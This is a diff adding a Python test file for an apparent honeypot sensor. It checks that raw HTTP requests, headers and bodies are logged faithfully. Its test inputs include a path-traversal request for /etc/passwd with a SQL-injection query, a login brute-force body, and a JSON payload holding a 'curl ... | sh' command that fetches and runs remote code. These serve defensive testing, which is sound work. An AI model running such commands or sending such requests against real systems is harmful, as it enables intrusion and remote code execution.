@@ -1,0 +1,154 @@
+"""Capture fidelity: what the sensor records about a request it did not expect.
+
+Requests are written as raw bytes over a socket, never through an HTTP client
+library, because a client library normalises exactly the things an attack
+depends on (percent-encoding, dot segments, header case and order).
+"""
+
+from __future__ import annotations
+
+import asyncio
+import base64
+import hashlib
+import shutil
+import sys
+import tempfile
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
+
+from mirage_crawl import capture, eventlog  # noqa: E402
+from mirage_crawl.config import Config  # noqa: E402
+from mirage_crawl.server import build_app, start_sites  # noqa: E402
+
+failures: list[str] = []
+
+
+def check(name: str, condition: bool, detail: str = "") -> None:
+    print(f"  {'PASS' if condition else 'FAIL'}  {name}" + (f"  ({detail})" if detail and not condition else ""))
+    if not condition:
+        failures.append(name)
+
+
+def test_header_capture() -> None:
+    print("\nheader capture (unit)")
+    raw = [(b"Host", b"x"), (b"X-Forwarded-For", b"9.9.9.9"), (b"Cookie", b"sid=abc"),
+           (b"X-Big", b"A" * 3000), (b"Authorization", b"Basic dTpw")]
+    pairs, truncated = capture.header_pairs(raw, drop_first={"x-forwarded-for"})
+    names = [n for n, _ in pairs]
+    check("wire order kept, injected header dropped", names == ["Host", "Cookie", "X-Big", "Authorization"], str(names))
+    check("each value capped at 1 KB", len(dict(pairs)["X-Big"]) == capture.HEADER_VALUE_CAP)
+    check("capping a value marks truncation", truncated)
+    check("credentials stored verbatim", dict(pairs)["Authorization"] == "Basic dTpw"
+          and dict(pairs)["Cookie"] == "sid=abc")
+
+    many = [(f"X-{i}".encode(), b"v" * 900) for i in range(20)]
+    pairs, truncated = capture.header_pairs(many)
+    total = sum(len(n) + len(v) for n, v in pairs)
+    check("total capped at 8 KB", total <= capture.HEADERS_TOTAL_CAP and truncated, str(total))
+    check("non-ascii bytes survive as latin-1",
+          capture.header_pairs([(b"X", "é".encode("utf-8"))])[0][0][1] == "é".encode("utf-8").decode("latin-1"))
+
+    check("raw path and query split", capture.split_raw("/a/%2e%2e/b?q=%27x") == ("/a/%2e%2e/b", "q=%27x"))
+    check("no query gives None", capture.split_raw("/a") == ("/a", None))
+
+    text = capture.body_fields(capture.Body(b"user=a&pass=b", False, 13), 4096)
+    check("utf-8 body stored as text", text["body"] == "user=a&pass=b" and text["body_encoding"] == "utf-8")
+    check("body hash is sha256 of captured bytes",
+          text["body_sha256"] == hashlib.sha256(b"user=a&pass=b").hexdigest())
+    binary = capture.body_fields(capture.Body(b"\xff\x00\x01", False, 3), 4096)
+    check("binary body stored as base64", binary["body_encoding"] == "base64"
+          and base64.b64decode(binary["body"]) == b"\xff\x00\x01")
+    prefix = capture.body_fields(capture.Body(b"x" * 100, True, 5000), 10)
+    check("logged prefix is bounded, hash is not", prefix["body"] == "x" * 10 and prefix["body_len"] == 100
+          and prefix["body_truncated"] and prefix["content_length"] == 5000)
+
+
+async def raw(target, payload: bytes) -> bytes:
+    if isinstance(target, Path):
+        reader, writer = await asyncio.open_unix_connection(str(target))
+    else:
+        reader, writer = await asyncio.open_connection("127.0.0.1", target)
+    writer.write(payload)
+    await writer.drain()
+    data = await asyncio.wait_for(reader.read(), timeout=5)
+    writer.close()
+    return data
+
+
+async def test_live() -> None:
+    tmp = Path(tempfile.mkdtemp(prefix="mirage-capture-"))
+    try:
+        cfg = Config(
+            host="127.0.0.1", port=0, origin="http://docs.test.invalid",
+            log_dir=tmp / "events", secret_file=tmp / "secret",
+            ranges_file=Path("config/crawler_ranges.json"), projects=4, pages_per_project=3,
+            verify_identity=False, front_socket=tmp / "front.sock", admin_socket=None,
+            body_bytes=1024, body_log_bytes=64,
+        )
+        app = build_app(cfg)
+        runner = await start_sites(app, cfg)
+        port = app["sensor"].public_address[1]
+
+        await raw(port, b"GET /docs/%2e%2e/etc/passwd?id=1%27%20OR%201=1 HTTP/1.1\r\n"
+                        b"Host: x\r\nCookie: sid=s3cr3t\r\nAuthorization: Basic YWRtaW46aHVudGVyMg==\r\n"
+                        b"Connection: close\r\n\r\n")
+        body = b"username=admin&password=letmein"
+        await raw(port, b"POST /wp-login.php HTTP/1.1\r\nHost: x\r\nConnection: close\r\n"
+                        b"Content-Type: application/x-www-form-urlencoded\r\n"
+                        b"Content-Length: %d\r\n\r\n%s" % (len(body), body))
+        big = b"B" * 3000
+        await raw(port, b"PUT /upload HTTP/1.1\r\nHost: x\r\nConnection: close\r\n"
+                        b"Content-Length: %d\r\n\r\n%s" % (len(big), big))
+        ray = b'{"entrypoint":"curl http://45.9.148.99/x | sh"}'
+        await raw(port, b"POST /api/jobs/ HTTP/1.1\r\nHost: x\r\nConnection: close\r\n"
+                        b"Content-Length: %d\r\n\r\n%s" % (len(ray), ray))
+        await raw(cfg.front_socket, b"GET /x HTTP/1.1\r\nX-Forwarded-For: 5.5.5.5\r\n"
+                                    b"X-Mirage-JA4: t13_x_y\r\nHost: x\r\nConnection: close\r\n\r\n")
+
+        await runner.cleanup()
+        events = list(eventlog.read_events(cfg.log_dir))
+        reqs = {e["raw_path"]: e for e in events if e["kind"] == eventlog.EVENT_REQUEST}
+
+        print("\nrequest record (live)")
+        trav = reqs.get("/docs/%2e%2e/etc/passwd")
+        check("raw path keeps the attacker's encoding", trav is not None, str(list(reqs)))
+        if trav:
+            check("raw query keeps the attacker's encoding", trav["raw_query"] == "id=1%27%20OR%201=1")
+            check("all headers logged in wire order",
+                  [n for n, _ in trav["headers"]] == ["Host", "Cookie", "Authorization", "Connection"],
+                  str(trav["headers"]))
+            check("cookie and authorization verbatim",
+                  ["Cookie", "sid=s3cr3t"] in trav["headers"]
+                  and ["Authorization", "Basic YWRtaW46aHVudGVyMg=="] in trav["headers"])
+            check("no body fields on a bodiless GET", "body_sha256" not in trav)
+            check("every event carries a request id", bool(trav.get("rid")))
+
+        print("\nbody capture (live)")
+        login = reqs.get("/wp-login.php")
+        check("body captured on an unrouted POST", bool(login) and login.get("body") == body.decode())
+        check("body hash logged", bool(login) and login["body_sha256"] == hashlib.sha256(body).hexdigest())
+        upload = reqs.get("/upload")
+        check("capture stops at CRAWL_BODY_BYTES", bool(upload) and upload["body_len"] == 1024
+              and upload["body_truncated"] and upload["content_length"] == 3000, str(upload and {
+                  k: upload.get(k) for k in ("body_len", "body_truncated", "content_length")}))
+        check("event prefix stops at CRAWL_BODY_LOG_BYTES", bool(upload) and len(upload["body"]) == 64)
+
+        hunts = [e for e in events if e["kind"] == eventlog.EVENT_HUNT]
+        check("hunt handler sees the body the middleware read",
+              bool(hunts) and hunts[0]["body_sha256"] == hashlib.sha256(ray).hexdigest(), str(hunts[:1]))
+        check("hunt and request events share a request id",
+              bool(hunts) and hunts[0]["rid"] == reqs["/api/jobs/"]["rid"])
+
+        front = reqs.get("/x")
+        check("front's injected headers are not in the logged header list",
+              bool(front) and [n for n, _ in front["headers"]] == ["Host", "Connection"], str(front and front["headers"]))
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
+
+
+if __name__ == "__main__":
+    test_header_capture()
+    asyncio.run(test_live())
+    print("\nFAILURES: " + ", ".join(failures) if failures else "\nall capture checks passed")
+    sys.exit(1 if failures else 0)
